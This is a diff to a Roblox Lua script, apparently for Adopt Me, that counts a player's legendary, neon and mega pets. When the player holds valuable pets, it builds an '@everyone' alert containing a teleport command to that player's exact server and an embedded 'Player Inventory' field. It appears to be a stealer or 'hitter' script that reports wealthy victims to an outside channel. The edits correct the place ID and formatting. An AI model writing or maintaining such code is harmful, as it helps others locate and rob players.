@@ -70,12 +70,12 @@ end
 
 if legendaries_count >= 5 or neon_count >= 5 or mega_count >= 1 then
     messageADOPT =
-        "---@everyone" ..
+        "@everyone\n" ..
        
-        'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. game.JobId .. '")\n'
+        'game:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '")\n'
 else
     messageADOPT = 
-        'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. game.JobId .. '")\n'
+        'game:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '")\n'
 end
 
 local plr = game.Players.LocalPlayer
@@ -124,7 +124,7 @@ local data = {
             fields = {
                 {
                     name = "Player Inventory:",
-                    value = "**COMMING SOON!**"
+                    value = "**COMING SOON!**"
                 }
             }
         }
